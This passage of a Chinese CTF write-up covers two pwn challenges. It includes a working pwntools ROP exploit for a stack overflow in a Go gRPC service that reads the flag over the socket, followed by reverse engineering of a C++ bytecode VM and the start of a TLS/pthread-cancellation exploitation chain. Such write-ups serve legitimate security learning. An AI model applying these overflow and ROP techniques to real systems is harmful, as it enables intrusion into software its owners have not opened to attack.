-I. --python_out=. --grpc_python_out=. ./ggbond.proto<br></code></pre></td></tr></table></figure><p>会生成ggbond_pb2.py和ggbond_pb2_grpc.py两个文件，_pb2中定义了数据结构，_pd2_grpc中定义了方法</p><p>交互部分代码，根据ggbond_pb2和ggbond_pb2_grpc中的函数和proto文件猜着写就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> grpc<br><br><span class="hljs-keyword">import</span> ggbond_pb2<br><span class="hljs-keyword">import</span> ggbond_pb2_grpc<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">whoami</span>(<span class="hljs-params">chan</span>):<br>    stub=ggbond_pb2_grpc.GGBondServerStub(chan)<br>    respond=stub.Handler(ggbond_pb2.Request(whoami=ggbond_pb2.WhoamiRequest()))<br>    <span class="hljs-keyword">return</span> respond<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">role_change</span>(<span class="hljs-params">chan,role</span>):<br>    stub=ggbond_pb2_grpc.GGBondServerStub(chan)<br>    respond=stub.Handler(ggbond_pb2.Request(role_change=ggbond_pb2.RoleChangeRequest(role=role)))<br>    <span class="hljs-keyword">return</span> respond<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">repeater</span>(<span class="hljs-params">chan,message</span>):<br>    stub=ggbond_pb2_grpc.GGBondServerStub(chan)<br>    respond=stub.Handler(ggbond_pb2.Request(repeater=ggbond_pb2.RepeaterRequest(message=message)))<br>    <span class="hljs-keyword">return</span> respond<br><br><br>channel=grpc.insecure_channel(<span class="hljs-string">&#x27;localhost:23334&#x27;</span>)<br><span class="hljs-built_in">print</span>(whoami(channel))<br><span class="hljs-built_in">print</span>(role_change(channel,<span class="hljs-number">3</span>))<br><span class="hljs-built_in">print</span>(repeater(channel,<span class="hljs-string">&#x27;Eurus&#x27;</span>))<br></code></pre></td></tr></table></figure><h2 id="go，狗都不逆，汪"><a href="#go，狗都不逆，汪" class="headerlink" title="go，狗都不逆，汪"></a>go，狗都不逆，汪</h2><p>既然会交互了那就随便试试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">channel=grpc.insecure_channel(<span class="hljs-string">&#x27;localhost:23334&#x27;</span>)<br><span class="hljs-built_in">print</span>(role_change(channel,<span class="hljs-number">6</span>))<br><span class="hljs-built_in">print</span>(role_change(channel,<span class="hljs-number">3</span>))<br><span class="hljs-built_in">print</span>(repeater(channel,<span class="hljs-string">&#x27;Eurus&#x27;</span>))<br></code></pre></td></tr></table></figure><p>输出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">python exp.py</span><br>role_change &#123;<br>  message: &quot;Role No Change.&quot;<br>&#125;<br><br>role_change &#123;<br>  message: &quot;New Role: SDaddy.&quot;<br>&#125;<br><br>repeater &#123;<br>  message: &quot;SDaddy: YBYB, YBBB.&quot;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后IDA搜”Role No Change.”字符串搜到了处理函数main.(*server).Handler</p><p>role_change处理部分，role&#x3D;3的时候有向栈上复制数据的操作，数据来源是将输入base64解码</p><img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/overflow.png" class title="overflow"><p>那就可以愉快的溢出了 ^v^</p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>由于交互是通过端口进行的，不是将输入输出重定向到远程，所以弹不了shell，直接打orw</p><ul><li>爆破确认现在端口的fd，这里是7</li><li>有syscall有gadget没开pie，可以直接用（甚至连flag字符串都有），真方便~</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">import</span> grpc<br><br><span class="hljs-keyword">import</span> ggbond_pb2<br><span class="hljs-keyword">import</span> ggbond_pb2_grpc<br><br><span class="hljs-keyword">import</span> base64<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">whoami</span>(<span class="hljs-params">chan</span>):<br>    stub=ggbond_pb2_grpc.GGBondServerStub(chan)<br>    respond=stub.Handler(ggbond_pb2.Request(whoami=ggbond_pb2.WhoamiRequest()))<br>    <span class="hljs-keyword">return</span> respond<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">role_change</span>(<span class="hljs-params">chan,role</span>):<br>    stub=ggbond_pb2_grpc.GGBondServerStub(chan)<br>    respond=stub.Handler(ggbond_pb2.Request(role_change=ggbond_pb2.RoleChangeRequest(role=role)))<br>    <span class="hljs-keyword">return</span> respond<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">repeater</span>(<span class="hljs-params">chan,message</span>):<br>    stub=ggbond_pb2_grpc.GGBondServerStub(chan)<br>    respond=stub.Handler(ggbond_pb2.Request(repeater=ggbond_pb2.RepeaterRequest(message=base64.b64encode(message))))<br>    <span class="hljs-keyword">return</span> respond<br><br><br>channel=grpc.insecure_channel(<span class="hljs-string">&#x27;localhost:23334&#x27;</span>)<br><span class="hljs-built_in">print</span>(role_change(channel,<span class="hljs-number">3</span>))<br>rdi_addr=<span class="hljs-number">0x401537</span><br>rsi_addr=<span class="hljs-number">0x422398</span><br>rdx_addr=<span class="hljs-number">0x461bd1</span><br>rax_addr=<span class="hljs-number">0x4101e6</span><br>syscall_addr=<span class="hljs-number">0x40452C</span><br>flag_addr=<span class="hljs-number">0x7FAEEC</span><br>bss_addr=<span class="hljs-number">0xC90000</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xc8</span><br>payload+=p64(rdi_addr)+p64(flag_addr)+p64(rsi_addr)+p64(<span class="hljs-number">0</span>)+p64(rdx_addr)+p64(<span class="hljs-number">0</span>)<br>payload+=p64(rax_addr)+p64(<span class="hljs-number">2</span>)+p64(syscall_addr)<br>payload+=p64(rdi_addr)+p64(<span class="hljs-number">8</span>)+p64(rsi_addr)+p64(bss_addr)+p64(rdx_addr)+p64(<span class="hljs-number">0x30</span>)<br>payload+=p64(rax_addr)+p64(<span class="hljs-number">0</span>)+p64(syscall_addr)<br>payload+=p64(rdi_addr)+p64(<span class="hljs-number">7</span>)+p64(rsi_addr)+p64(bss_addr)+p64(rdx_addr)+p64(<span class="hljs-number">0x30</span>)<br>payload+=p64(rax_addr)+p64(<span class="hljs-number">1</span>)+p64(syscall_addr)<br><span class="hljs-built_in">print</span>(repeater(channel,payload))<br></code></pre></td></tr></table></figure><p>tcpdump抓包，因为是本地所以抓lo</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo tcpdump -w flag.pcap -i lo</span><br></code></pre></td></tr></table></figure><img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/flag.png" class title="flag"><p>简简又单单，但有笨b没做出来^v^</p><h1 id="cvm"><a href="#cvm" class="headerlink" title="cvm"></a>cvm</h1><p>要打TLS但有个屑为了调试直接把start_thread patch了^v^</p><h2 id="c-，狗都不逆，汪"><a href="#c-，狗都不逆，汪" class="headerlink" title="c++，狗都不逆，汪"></a>c++，狗都不逆，汪</h2><p>比赛的时候其实已经把这玩意逆完了</p><p>vm的控制数据结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm</span> &#123;</span><br>    <span class="hljs-type">size_t</span> overflow;<span class="hljs-comment">// 不知道干嘛的</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>        <span class="hljs-type">void</span> *stack_base;<span class="hljs-comment">// 栈基址指针</span><br>        <span class="hljs-type">void</span> *stack_top;<span class="hljs-comment">// 栈顶指针</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>            <span class="hljs-type">void</span> *mem_addr;<span class="hljs-comment">// 栈空间地址</span><br>            <span class="hljs-type">size_t</span> mem_size;<span class="hljs-comment">// 栈空间大小，0x20000</span><br>        &#125; mem;<br>    &#125; <span class="hljs-built_in">stack</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>        <span class="hljs-type">void</span> *mem_addr;<span class="hljs-comment">// text段地址</span><br>        <span class="hljs-type">size_t</span> mem_size;<span class="hljs-comment">// text段大小，0x20000</span><br>    &#125; code;<br>    <span class="hljs-comment">/* </span><br><span class="hljs-comment">    stack和code的数据结构</span><br><span class="hljs-comment">        high</span><br><span class="hljs-comment">         |------------------|</span><br><span class="hljs-comment">         |stack   |</span><br><span class="hljs-comment">         |------------------|</span><br><span class="hljs-comment">         |code   |</span><br><span class="hljs-comment">         |------------------|</span><br><span class="hljs-comment">        low</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">void</span> *func_calls_begin;<span class="hljs-comment">// 不知道干嘛的+1</span><br>    <span class="hljs-type">void</span> *func_calls_end;<span class="hljs-comment">// 不知道干嘛的+2</span><br>    <span class="hljs-type">void</span> *unknown;<span class="hljs-comment">// 不知道干嘛的+3</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> lock;<span class="hljs-comment">// 处理interrupt的锁</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> finish;<span class="hljs-comment">// vm是否停止的标记</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> field1;<span class="hljs-comment">// 占位</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> field2;<span class="hljs-comment">// 占位+1</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> code_rip;<span class="hljs-comment">// rip，offset的形式</span><br>&#125;<br></code></pre></td></tr></table></figure><p>支持的指令：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_nop</span>():<span class="hljs-comment"># rip++</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x00&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_pop</span>():<span class="hljs-comment"># stack_rop-=8</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x01&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_add</span>():<span class="hljs-comment"># pop出两个数计算后push进stack，下同</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x02&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_sub</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x03&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_mul</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x04&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_div</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x05&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_mod</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x06&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_and</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x07&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_or</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x08&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_xor</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x09&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_not</span>():<span class="hljs-comment"># 单目运算符类似</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0A&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_call</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0B&#x27;</span><span class="hljs-comment"># 怪，不管不重要</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_ret</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0C&#x27;</span><span class="hljs-comment"># pop offset，rip=offset</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_lea</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0D&#x27;</span><span class="hljs-comment"># pop offset，push stack_base+offset</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_push1</span>(<span class="hljs-params">value</span>):<span class="hljs-comment"># push x个字节，下同</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0E&#x27;</span> + value.to_bytes(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_push2</span>(<span class="hljs-params">value</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x0F&#x27;</span> + value.to_bytes(<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_push4</span>(<span class="hljs-params">value</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x10&#x27;</span> + value.to_bytes(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_push8</span>(<span class="hljs-params">value</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x11&#x27;</span> + value.to_bytes(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_modcall</span>():<span class="hljs-comment"># 可以通过这个进行read和write，通过throw exception和catch实现</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x12&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_jz</span>():<span class="hljs-comment"># pop offset，pop num，根据num判断是否跳转到offset，下同</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x13&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_jb</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x14&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_ja</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x15&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_dup</span>():<span class="hljs-comment"># push *stack_top</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x16&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vm_hlt</span>():<span class="hljs-comment"># stop</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x17&#x27;</span><br></code></pre></td></tr></table></figure><p>program.bin如下：</p><table><thead><tr><th>rip</th><th>字节码</th><th>命令</th><th>栈内容</th></tr></thead><tbody><tr><td>0</td><td><strong>11</strong> 57 65 6c 63 6f 6d 65 20</td><td>push b’Welcome ‘</td><td>b’Welcome ‘</td></tr><tr><td>9</td><td><strong>11</strong> 74 6f 20 54 53 43 54 46</td><td>push b’to TSCTF’</td><td>b’Welcome to TSCTF’</td></tr><tr><td>12</td><td><strong>11</strong> 21 0a 0a 53 74 61 72 74</td><td>push b’!\n\nStart’</td><td>b’Welcome to TSCTF!\n\nStart’</td></tr><tr><td>1b</td><td><strong>11</strong> 20 79 6f 75 72 20 65 78</td><td>push b’ your ex’</td><td>b’Welcome to TSCTF!\n\nStart your ex’</td></tr><tr><td>24</td><td><strong>11</strong> 70 6c 6f 69 74 20 66 72</td><td>push b’ploit fr’</td><td>b’Welcome to TSCTF!\n\nStart your exploit fr’</td></tr><tr><td>2d</td><td><strong>11</strong> 6f 6d 20 68 65 72 65 21</td><td>push b’om here!’</td><td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td></tr><tr><td>36</td><td><strong>11</strong> 30 00 00 00 00 00 00 00</td><td>push p64(0x30)</td><td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td></tr><tr><td></td><td></td><td></td><td>+p64(0x30)</td></tr><tr><td>3f</td><td><strong>11</strong> 00 00 00 00 00 00 00 00</td><td>push p64(0)</td><td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td></tr><tr><td></td><td></td><td></td><td>+p64(0x30)+p64(0)</td></tr><tr><td>48</td><td><strong>0d</strong></td><td>pop p64(0)</td><td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td></tr><tr><td></td><td></td><td>push p64(stack)</td><td>+p64(0x30)+p64(stack)</td></tr><tr><td>49</td><td><strong>11</strong> fc d2 98 14 10 2c 24 14</td><td>push p64(output)</td><td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td></tr><tr><td></td><td></td><td></td><td>+p64(0x30)+p64(stack)+p64(output)</td></tr><tr><td>52</td><td><strong>12</strong></td><td>output(stack,0x30)</td><td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td></tr><tr><td></td><td></td><td></td><td>+p64(cnt)</td></tr><tr><td>53</td><td><strong>11</strong> 30 00 00 00 00 00 00 00</td><td>push p64(0x30)</td><td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td></tr><tr><td></td><td></td><td></td><td>+p64(cnt)+p64(0x30)</td></tr><tr><td>5c</td><td><strong>03</strong></td><td>pop p64(0x30)</td><td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td></tr><tr><td></td><td></td><td>pop p64(0x30)</td><td>+p64(0x30-cnt)</td></tr><tr><td></td><td></td><td>push p64(0x30-cnt)</td><td></td></tr><tr><td>5d</td><td><strong>16</strong></td><td>dup</td><td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td></tr><tr><td></td><td></td><td></td><td>+p64(0x30-cnt)+p64(0x30-cnt)</td></tr><tr><td>5e</td><td><strong>11</strong> 9a 00 00 00 00 00 00 00</td><td>push p64(0x9a)</td><td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td></tr><tr><td></td><td></td><td></td><td>+p64(0x30-cnt)+p64(0x30-cnt)+p64(0x9a)</td></tr><tr><td>67</td><td><strong>15</strong></td><td>jg</td><td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td></tr><tr><td></td><td></td><td></td><td>+p64(0x30-cnt)</td></tr><tr><td>68</td><td><strong>11</strong> 9a 00 00 00 00 00 00 00</td><td>push p64(0x9a)</td><td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td></tr><tr><td></td><td></td><td></td><td>+p64(0x30-cnt)+p64(0x9a)</td></tr><tr><td>71</td><td><strong>14</strong></td><td>jl</td><td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td></tr><tr><td>72</td><td><strong>11</strong> 9b 00 00 00 00 00 00 00</td><td>push p64(0x9b)</td><td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td></tr><tr><td></td><td></td><td></td><td>+p64(0x9b)</td></tr><tr><td>7b</td><td><strong>11</strong> 00 10 00 00 00 00 00 00</td><td>push p64(0x1000)</td><td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td></tr><tr><td></td><td></td><td></td><td>+p64(0x9b)+p64(0x1000)</td></tr><tr><td>84</td><td><strong>11</strong> 00 00 00 00 00 00 00 00</td><td>push p64(0)</td><td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td></tr><tr><td></td><td></td><td></td><td>+p64(0x9b)+p64(0x1000)+p64(0)</td></tr><tr><td>8d</td><td><strong>0d</strong></td><td>pop p64(0)</td><td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td></tr><tr><td></td><td></td><td>push p64(stack)</td><td>+p64(0x9b)+p64(0x1000)+p64(stack)</td></tr><tr><td>8e</td><td><strong>11</strong> 1c 85 c6 e3 59 76 6d f0</td><td>push p64(input)</td><td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td></tr><tr><td></td><td></td><td></td><td>+p64(0x9b)+p64(0x1000)+p64(stack)</td></tr><tr><td></td><td></td><td></td><td>+p64(input)</td></tr><tr><td>97</td><td><strong>12</strong></td><td>input(stack,0x1000)</td><td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td></tr><tr><td></td><td></td><td></td><td>+p64(0x9b)+p64(cnt)</td></tr><tr><td>98</td><td><strong>01</strong></td><td>pop</td><td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td></tr><tr><td></td><td></td><td></td><td>+p64(0x9b)</td></tr><tr><td>99</td><td><strong>0c</strong></td><td>ret</td><td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td></tr><tr><td>9a</td><td><strong>17</strong></td><td>hlt</td><td></td></tr><tr><td>9b</td><td><strong>11</strong> 48 61 76 65 20 66 75 6e</td><td>push b’Have fun’</td><td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td></tr><tr><td></td><td></td><td></td><td>+b’Have fun’</td></tr><tr><td>a4</td><td><strong>11</strong> 08 00 00 00 00 00 00 00</td><td>push p64(8)</td><td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td></tr><tr><td></td><td></td><td></td><td>+b’Have fun’+p64(8)</td></tr><tr><td>ad</td><td><strong>11</strong> 30 00 00 00 00 00 00 00</td><td>push p64(0x30)</td><td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td></tr><tr><td></td><td></td><td></td><td>+b’Have fun’+p64(8)+p64(0x30)</td></tr><tr><td>b6</td><td><strong>0d</strong></td><td>pop p64(0x30)</td><td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td></tr><tr><td></td><td></td><td>push p64(stack+0x30)</td><td>+b’Have fun’+p64(8)+p64(0x30)+p64(stack)</td></tr><tr><td>b7</td><td><strong>11</strong> fc d2 98 14 10 2c 24 14</td><td>push p64(output)</td><td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td></tr><tr><td></td><td></td><td></td><td>+b’Have fun’+p64(8)+p64(0x30)+p64(stack)</td></tr><tr><td></td><td></td><td></td><td>+p64(output)</td></tr><tr><td>c0</td><td><strong>12</strong></td><td>output(stack+0x30,8)</td><td>b’Welcome to TSCTF!\n\nStart your exploit from here!’</td></tr><tr><td></td><td></td><td></td><td>+b’Have fun’+p64(cnt)</td></tr><tr><td>c1</td><td><strong>17</strong></td><td>hlt</td><td></td></tr></tbody></table><p>漏洞点，判断stack overflow的时候用的&#x3D;&#x3D;，但push有1248四种，可以溢出</p><img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/stackoverflow.png" class title="stackoverflow"><p>且memory out of range还取了页对齐，所以可以溢出0xfff字节</p><img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/outofrange.png" class title="outofrange"><p>比赛的时候注意到这个了，但当时脑子抽了以为stack在code下面，虽然就算没搞错我把多线程patch掉了且不会打TLS也没戏.jpg</p><p><em>其实也不算太难逆，主要是各种检查和io都是由exception实现的，看起来很丑，嗯，都是c++的锅</em></p><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><p>先贴一个线程结构体（部分）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pthread</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* Unwind information.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pthread_unwind_buf</span> *<span class="hljs-title">cleanup_jmp_buf</span>;</span><br>  <span class="hljs-type">void</span> *result;<br><br>  <span class="hljs-comment">/* Flags determining processing of cancellation.  */</span><br>  <span class="hljs-type">int</span> cancelhandling;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="read"><a href="#read" class="headerlink" title="read"></a>read</h3><p>read和write函数中会根据__libc_single_threaded全局变量判断是否需要调用__pthread_enable_asynccancel开启异步取消</p><p><em>源码不如汇编系列，珍爱生命原理宏定义</em></p><img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/single_thread.png" class title="single_thread"><p>多线程时__libc_single_threaded&#x3D;0否则__libc_single_threaded&#x3D;1</p><h3 id="pthread-enable-asynccancel"><a href="#pthread-enable-asynccancel" class="headerlink" title="__pthread_enable_asynccancel"></a>__pthread_enable_asynccancel</h3><p>__pthread_enable_asynccancel大致流程：</p><ul><li>获取当前线程的cancelhandling，进入循环</li><li>判断是否已经设置了异步取消CANCELTYPE_BIT，是则跳出循环，否则继续执行</li><li>设置CANCELTYPE_BIT</li><li>判断当前线程的cancelhandling是否设置了CANCELED_BITMASK需要被取消，否则跳出循环，是则<ul><li>设置当前线程result为PTHREAD_CANCELED</li><li>调用__do_cancel取消线程</li></ul></li></ul><h3 id="do-cancel"><a href="#do-cancel" class="headerlink" title="__do_cancel"></a>__do_cancel</h3><ul><li>设置当前线程cancelhandling的EXITING_BITMASK（确保不会再被其他线程取消）</li><li>调用__pthread_unwind，参数为当前线程的cleanup_jmp_buf</li></ul><h3 